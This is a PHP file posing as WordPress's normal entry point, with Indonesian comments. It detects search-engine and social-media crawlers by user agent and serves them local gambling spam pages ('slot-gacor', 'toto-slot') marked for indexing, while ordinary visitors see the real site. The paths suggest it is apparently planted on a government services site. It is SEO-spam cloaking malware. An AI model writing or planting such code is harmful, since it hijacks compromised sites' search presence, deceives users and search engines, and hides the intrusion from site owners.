<?php
/**
 * WordPress Cloaking System
 * Menampilkan konten berbeda untuk bot crawler
 */

// =============================================================================
//  Daftar Bot
// =============================================================================

$bots = array(
    'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
    'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo',
    'YandexBot', 'Baiduspider', 'TelegramBot', 'facebookexternalhit',
    'Pinterest', 'W3C_Validator', 'Google-Site-Verification',
    'Google-InspectionTool', 'Applebot', 'AhrefsBot',
    'SEMrushBot', 'MJ12bot', 'Twitterbot', 'LinkedInBot'
);

// Path ke file konten lokal (langsung di root web)
$root_dir = __DIR__ . '/';

// =============================================================================
//  Fungsi Deteksi Bot
// =============================================================================

function is_bot_detected($bots_list) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    if (empty($user_agent)) {
        return false;
    }
    
    foreach ($bots_list as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

function get_bot_content($root_dir) {
    $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
    $path = strtok($request_uri, '?');
    $path = rtrim($path, '/');
    
    if ($path === '') {
        $path = '/';
    }
    
    // Tentukan file konten berdasarkan path
    // Homepage (root, /web, atau kosong) -> slot-gacor.html
    if ($path === '/' || $path === '/web' || $path === '/web/') {
        $file = $root_dir . 'slot-gacor.html';
    } 
    // Path /web/tramites-y-servicios -> toto-slot.html
    elseif (strpos($path, '/web/tramites-y-servicios') === 0) {
        $file = $root_dir . 'toto-slot.html';
    } 
    // Default fallback jika path tidak dikenal
    else {
        $file = $root_dir . 'slot-gacor.html'; // fallback ke homepage
    }
    
    // Ambil konten dari file
    if (file_exists($file) && is_readable($file)) {
        return file_get_contents($file);
    }
    
    // Fallback jika file tidak ada
    return '<!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>Content</title></head>
    <body><h1>Welcome</h1><p>Content for crawlers</p></body>
    </html>';
}

// =============================================================================
//  Eksekusi Cloaking
// =============================================================================

if (is_bot_detected($bots)) {
    // Bersihkan buffer
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    // Set headers
    header('HTTP/1.1 200 OK');
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Robots-Tag: index, follow');
    
    // Tampilkan konten bot
    echo get_bot_content($root_dir);
    exit;
}

// =============================================================================
//  Load WordPress Normal
// =============================================================================

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
